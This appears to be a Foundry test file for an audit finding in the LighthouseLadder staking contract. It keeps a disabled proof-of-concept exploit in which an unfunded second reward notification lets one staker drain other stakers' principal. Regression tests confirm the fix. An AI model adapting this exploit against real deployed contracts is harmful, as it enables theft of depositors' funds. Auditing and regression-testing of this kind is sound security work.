// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test, console} from "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {LighthouseLadder} from "../../src/LighthouseLadder.sol";
import {LighthouseLadderFixed} from "./LighthouseLadderFixed.sol";

contract PoCToken is ERC20 {
    constructor() ERC20("Island", "ISL") {}
    function mint(address to, uint256 a) external { _mint(to, a); }
}

contract LadderOrderingPoC is Test {
    PoCToken token;
    LighthouseLadder pool;

    address dist = makeAddr("feeRemittanceSafe");
    address alice = makeAddr("alice"); // victim
    address bob = makeAddr("bob");     // exits first
    uint256 constant DURATION = 60 days;

    function setUp() public {
        token = new PoCToken();
        pool = new LighthouseLadder(dist, address(token), address(token));
        token.mint(alice, 100_000e18);
        token.mint(bob, 100_000e18);
        token.mint(dist, 100_000e18);
        vm.prank(alice); token.approve(address(pool), type(uint256).max);
        vm.prank(bob);   token.approve(address(pool), type(uint256).max);
    }

    // ─────────────────────────────────────────────────────────────────
    // STEP 0: prove the precondition (owed > surplus) is REACHABLE through
    //         the contract's OWN guard, with no cheatcode state forging.
    // ─────────────────────────────────────────────────────────────────
    function _reachOvercommittedState() internal returns (uint256 bobId, uint256 aliceId) {
        vm.prank(alice); aliceId = pool.stake(1_000e18, 7 days);  // 0.4x
        vm.prank(bob);   bobId   = pool.stake(5_000e18, 7 days);  // 0.4x -> 5/6 of weight

        vm.prank(dist); token.transfer(address(pool), 60e18);     // REAL budget in
        vm.prank(dist); pool.notifyRewardAmount(60e18);           // guard passes

        vm.warp(vm.getBlockTimestamp() + DURATION + 1);                  // all 60e18 accrues, unclaimed

        // THE OPERATOR MISTAKE: notify a SECOND period WITHOUT transferring.
        // rewardSurplus() still reads 60e18 (period-1 rewards accrued but never
        // claimed are indistinguishable from fresh budget), so the "over-notify
        // is refused at the door" guard PASSES.
        vm.prank(dist); pool.notifyRewardAmount(60e18);
        vm.warp(vm.getBlockTimestamp() + DURATION + 1);

        console.log("--- OVERCOMMITTED STATE (no cheatcodes, guard-legal) ---");
        console.log("   alice owed  :", pool.earned(alice));
        console.log("   bob   owed  :", pool.earned(bob));
        console.log("   sum owed    :", pool.earned(alice) + pool.earned(bob));
        console.log("   TRUE surplus:", pool.rewardSurplus());
        assertGt(pool.earned(bob), pool.rewardSurplus(), "bob alone is owed more than the surplus");
    }

    /// AFTER THE FIX (audit C2, 2026-09-01) this state is UNREACHABLE.
    /// The second notify carries no fresh funding and is now refused, because
    /// notifyRewardAmount reserves rewardsOutstanding() before offering a
    /// budget — so period-1's accrued-but-unclaimed rewards can no longer be
    /// pledged a second time. This test was written to prove the door was
    /// open; it is kept, flipped, to prove it stays shut.
    function test_00_precondition_isNowUNREACHABLE() public {
        vm.prank(alice); pool.stake(1_000e18, 7 days);
        vm.prank(bob);   pool.stake(5_000e18, 7 days);

        vm.prank(dist); token.transfer(address(pool), 60e18);
        vm.prank(dist); pool.notifyRewardAmount(60e18);          // funded: fine
        vm.warp(vm.getBlockTimestamp() + DURATION + 1);          // all of it accrues

        // Everything emitted is now owed, so nothing is fundable. Note the
        // LIVE view is deliberately larger than the raw banked counter here:
        // `rewardsEmitted` is only written by a checkpoint, and no transaction
        // has touched the pool since the warp — which is precisely why the view
        // adds the un-banked window rather than reading storage alone.
        assertEq(pool.rewardsEmitted(), 0, "nothing banked yet: no tx since the warp");
        assertApproxEqRel(pool.rewardsOutstanding(), 60e18, 1e12, "but the debt is real and visible");
        // Not exactly zero, and it should not be: `rewardRate = 60e18 / 60 days`
        // truncates, so a few hundred thousand wei genuinely never got emitted
        // and IS fundable. What matters is that the ~60e18 of accrued rewards
        // is NOT in the budget, and that the dust is far too small to fund a
        // period — rewardRate would round to 0, so the notify still reverts
        // (test_01). Asserting an exact 0 here would be asserting a rounding
        // artefact, not the property.
        assertLt(pool.fundableBudget(), 1e9, "accrued rewards are not free budget; only truncation dust remains");

        // …and the un-funded second notify is refused at the door.
        vm.prank(dist);
        vm.expectRevert("Provided reward too high");
        pool.notifyRewardAmount(60e18);
    }

    /// The liability is retired when it is actually paid, so a LEGITIMATE
    /// second period (with real money behind it) is still accepted.
    function test_00b_fundedSecondPeriodIsStillAllowed() public {
        vm.prank(alice); pool.stake(1_000e18, 7 days);
        vm.prank(dist); token.transfer(address(pool), 60e18);
        vm.prank(dist); pool.notifyRewardAmount(60e18);
        vm.warp(vm.getBlockTimestamp() + DURATION + 1);

        vm.prank(alice); pool.getReward();                        // liability retired
        vm.prank(dist); token.transfer(address(pool), 60e18);     // real new budget
        vm.prank(dist); pool.notifyRewardAmount(60e18);           // accepted
        assertGt(pool.rewardRate(), 0, "a genuinely funded period still works");
    }

    // ─────────────────────────────────────────────────────────────────
    // THE EXPLOIT against the SHIPPED contract.
    // ─────────────────────────────────────────────────────────────────
    /// The exploit, re-aimed at the FIXED contract. It cannot even set itself
    /// up any more: `_reachOvercommittedState` needs the un-funded second
    /// notify, and C2 refuses it. Kept as the regression guard — if either fix
    /// is ever reverted, this reverts to a real exploit and fails loudly.
    function test_01_EXPLOIT_isRefusedAtTheDoor() public {
        vm.prank(alice); pool.stake(1_000e18, 7 days);
        vm.prank(bob);   pool.stake(5_000e18, 7 days);
        vm.prank(dist); token.transfer(address(pool), 60e18);
        vm.prank(dist); pool.notifyRewardAmount(60e18);
        vm.warp(vm.getBlockTimestamp() + DURATION + 1);

        // The un-funded second notify — the step the whole exploit rested on.
        vm.prank(dist);
        vm.expectRevert("Provided reward too high");
        pool.notifyRewardAmount(60e18);
    }

    /// @dev The original exploit body, preserved for the record. It is not run
    ///      against the fixed contract because its precondition is now
    ///      unreachable; `test_02` proves the same attack is harmless even if
    ///      an overcommitted state were somehow reached.
    function skip_test_01_EXPLOIT_shippedOrderBreaksSolvency() internal {
        (uint256 bobId, uint256 aliceId) = _reachOvercommittedState();

        uint256 trueSurplus = pool.rewardSurplus();
        uint256 bobOwed = pool.earned(bob);
        uint256 bobBefore = token.balanceOf(bob);

        vm.prank(bob); pool.withdrawPosition(bobId);

        uint256 bobGot = token.balanceOf(bob) - bobBefore;
        uint256 rewardsPaid = bobGot - 5_000e18;
        console.log("--- AFTER BOB EXITS (shipped order: _close then _payRewards) ---");
        console.log("   rewards paid to bob:", rewardsPaid);
        console.log("   TRUE surplus was   :", trueSurplus);
        console.log("   OVERPAY out of principal:", rewardsPaid - trueSurplus);
        console.log("   pool balance       :", token.balanceOf(address(pool)));
        console.log("   pool totalSupply   :", pool.totalSupply());

        assertEq(rewardsPaid, bobOwed, "paid in FULL - the surplus cap did not bind");
        assertGt(rewardsPaid, trueSurplus, "bob drained past the entire true surplus");
        assertLt(token.balanceOf(address(pool)), pool.totalSupply(),
            "INVARIANT BROKEN: pool balance < principal owed");

        // ALICE'S PRINCIPAL IS NOW UNRECOVERABLE BY ANY DOOR.
        vm.prank(alice); vm.expectRevert(); pool.withdrawPosition(aliceId);
        vm.prank(alice); vm.expectRevert(); pool.emergencyWithdraw(aliceId);
        vm.prank(alice); pool.getReward();                       // take everything she can
        vm.prank(alice); vm.expectRevert(); pool.emergencyWithdraw(aliceId);
        vm.prank(alice); vm.expectRevert(); pool.withdrawPosition(aliceId);

        console.log("--- ALICE IS STRANDED ---");
        console.log("   her principal ledger:", pool.balanceOf(alice));
        console.log("   pool balance left   :", token.balanceOf(address(pool)));
        console.log("   SHORTFALL           :", pool.totalSupply() - token.balanceOf(address(pool)));
    }

    // ─────────────────────────────────────────────────────────────────
    // COUNTERFACTUAL: identical script, only the two lines swapped.
    // ─────────────────────────────────────────────────────────────────
    function test_02_COUNTERFACTUAL_reorderHoldsTheInvariant() public {
        LighthouseLadderFixed fx = new LighthouseLadderFixed(dist, address(token), address(token));
        vm.prank(alice); token.approve(address(fx), type(uint256).max);
        vm.prank(bob);   token.approve(address(fx), type(uint256).max);

        vm.prank(alice); uint256 aliceId = fx.stake(1_000e18, 7 days);
        vm.prank(bob);   uint256 bobId   = fx.stake(5_000e18, 7 days);
        vm.prank(dist);  token.transfer(address(fx), 60e18);
        vm.prank(dist);  fx.notifyRewardAmount(60e18);
        vm.warp(vm.getBlockTimestamp() + DURATION + 1);
        vm.prank(dist);  fx.notifyRewardAmount(60e18);  // SAME unfunded notify
        vm.warp(vm.getBlockTimestamp() + DURATION + 1);

        uint256 trueSurplus = fx.rewardSurplus();
        uint256 bobOwed = fx.earned(bob);
        uint256 bobBefore = token.balanceOf(bob);
        vm.prank(bob); fx.withdrawPosition(bobId);
        uint256 rewardsPaid = token.balanceOf(bob) - bobBefore - 5_000e18;

        console.log("--- REORDERED CONTRACT, SAME ATTACK ---");
        console.log("   bob owed           :", bobOwed);
        console.log("   rewards paid to bob:", rewardsPaid);
        console.log("   true surplus       :", trueSurplus);
        console.log("   bob STILL owed (deferred, not stolen):", fx.rewards(bob));
        console.log("   pool balance       :", token.balanceOf(address(fx)));
        console.log("   pool totalSupply   :", fx.totalSupply());

        assertEq(rewardsPaid, trueSurplus, "cap binds at the TRUE surplus");
        assertGe(token.balanceOf(address(fx)), fx.totalSupply(), "invariant HOLDS");

        uint256 aliceBefore = token.balanceOf(alice);
        vm.prank(alice); fx.withdrawPosition(aliceId);
        assertEq(token.balanceOf(alice) - aliceBefore, 1_000e18, "alice keeps her whole deposit");
        console.log("   alice recovered    :", token.balanceOf(alice) - aliceBefore);
    }

    // ─────────────────────────────────────────────────────────────────
    // Does the bug bite WITHOUT the over-commit precondition (single,
    // properly-funded notify)? If not, the ordering is latent, not live.
    // ─────────────────────────────────────────────────────────────────
    function testFuzz_03_singleFundedNotify_orderingIsLatent(
        uint96 aliceAmt, uint96 bobAmt, uint96 reward, uint32 dur
    ) public {
        // Lower bound is the pool's own MIN_STAKE floor (2026-09-04 dust-
        // divisor fix): below it a stake is inadmissible.
        aliceAmt = uint96(bound(aliceAmt, pool.MIN_STAKE(), 5_000e18));
        bobAmt   = uint96(bound(bobAmt,   pool.MIN_STAKE(), 5_000e18));
        reward   = uint96(bound(reward,   1e15, 500e18));
        dur      = uint32(bound(dur, 7 days, 90 days));

        vm.prank(alice); uint256 aliceId = pool.stake(aliceAmt, dur);
        vm.prank(bob);   uint256 bobId   = pool.stake(bobAmt, dur);
        vm.prank(dist);  token.transfer(address(pool), reward);
        vm.prank(dist);  pool.notifyRewardAmount(reward);   // ONE funded notify
        vm.warp(vm.getBlockTimestamp() + uint256(dur) + 1);

        vm.prank(bob);   pool.withdrawPosition(bobId);
        assertGe(token.balanceOf(address(pool)), pool.totalSupply(), "invariant after bob");
        vm.prank(alice); pool.withdrawPosition(aliceId);
        assertGe(token.balanceOf(address(pool)), pool.totalSupply(), "invariant after alice");
        assertEq(pool.totalSupply(), 0);
    }
}
